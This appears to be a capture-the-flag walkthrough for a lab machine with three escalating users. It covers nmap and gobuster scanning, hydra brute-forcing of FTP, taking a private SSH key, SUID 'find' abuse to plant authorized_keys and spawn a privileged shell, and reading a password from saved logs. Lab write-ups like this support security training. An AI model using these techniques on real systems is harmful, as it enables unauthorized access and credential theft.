# Getting low user
- Navigate to IP address and see the web page. There we can find a user with name "low".
- With nmap, scan for the open ports and we can see that FTP is open on port 21, SSH on 22 and Apache on 80:
```
export $ip=192.168.10.10
sudo nmap -sC -sV -A -O -oN nmap/initial.log $ip -T4
```
- Go to port 80 and look around. We can't find anything useful. Try using gobuster:
```
gobuster -u http://$ip -w /opt/wordlist/medium.txt
```
- There, we find /archives. We find a wordlist named note_about_passwords.txt
- We can see that it lists passwords that maybe can be used to login to other service, like port 21 / ftp.
- Save the wordlists, for example to `~/wordlist.txt`
- try bruteforcing using hydra:
`hydra -l low -P ~/wordlist.txt $ip ftp`
- We find the password: `ahimsa`
- login to ftp using:
```
ftp -p $ip

enter the user as: low
enter the password as: ahimsa
```
- Navigate there and look around, we can get private key
```
cd files
get id_rsa
```
- Also, we can find reminder.txt which says that we need to escalate 3 times.
- SSH as low user:
```
ssh -i id_rsa low@$ip
```
- get the user flag:
```
cat /home/low/low.txt
```

# Escalate to medium
- As we are logged in as low user, we need to escalate our way to other user, in this case medium user.
- Let's find some common vulnerabillity: (like SUID bit files)
```
find / -type f -user medium -perm -4000 2>/dev/null
```
- We get that find is running with SUID Bit set, let's exploit this and get to user medium.
```
touch somefile
/usr/local/bin/find somefile -exec mkdir /home/medium/.ssh \;
/usr/local/bin/find somefile -exec cp /home/low/.ssh/authorized_keys /home/medium/.ssh/authorized_keys \;
```
- What we did was copy the authorized keys of user Low to user Medium's authorized_keys. This allows us to login as Medium via SSH with Low's private key. There's a reason for this, it's because we need to read syslog to escalate from medium user to high user. Being in group adm is needed in order to read syslog. However, if we simply run /bin/bash like: `/usr/local/bin/find somefile -exec /bin/bash -p \;`, our group won't be able to read syslog (Medium user is in syslog group, but running like this command won't make us part of adm group).
- Then what we do next is exit our ssh session and ssh again as user medium like this:
```
ssh medium@$ip -i id_rsa
```
- We are logged in as user medium.
- get the medium flag:
```
cat /home/medium/medium.txt
```

# Escalate to high
- Go to /var/saved:
```
cat /var/saved/syslog.saved
```
- Since we are talking about 3 idiots, I want to make it a twist to make it idiot (Not really, digging on logs is quite useful sometimes). There, we find a chat between user high and medium. In the chat, we can deduce that his password is IPm@nTh3F1ght3r-2020.
- Do this:
```
su high

enter IPm@nTh3F1ght3r-2020 as the password
```
- Get the flag:
```
cat /home/high/high.txt
```
